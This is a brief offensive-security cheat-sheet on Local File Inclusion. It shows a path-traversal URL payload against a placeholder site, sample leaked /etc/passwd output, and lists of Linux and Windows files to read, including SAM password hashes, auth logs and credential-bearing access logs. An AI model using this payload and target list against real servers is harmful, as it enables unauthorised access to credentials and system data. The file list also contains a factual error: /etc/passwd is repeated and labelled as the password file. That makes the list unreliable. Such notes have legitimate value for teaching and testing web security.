# LFI

The **Local File Include** vulnerability is a web vulnerbility that allows a hacker to read/view sensitive information on the Web Server.

In practice, the follow URL may be affected by LFI vulnerability:

```
https://company.com/download?ticket=3123345123-345345123.json
```

We see that we can change the variable indicating the file to be displayed. Try to change it with a local file with possible sensitive information:

```
https://company.com/download?ticket=../../../../../../etc/passwd
```

This URL will display the entire file content.

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
[..snip..]
```

## Sensitive file to get

{% code title="Linux Web Server" %}
```bash
/etc/passwd # system's user
/etc/passwd # system's password 
/etc/hosts # may contain subdomain
/var/log/apache2/access.log # may contain credentials
/var/log/auth.log # ssh logon
/var/log/secure # admin activities
```
{% endcode %}

{% code title="Windows Web Server" %}
```bash
C:\Windows\System32\drivers\etc\hosts # other domain and subdomain
C:\Windows\System32\config\SAM # password hashes 
C:\inetpub\logs\LogFiles\W3SVC1\*.log # IIS log
C:\Users\Administrator\Desktop\* # admin files
```
{% endcode %}





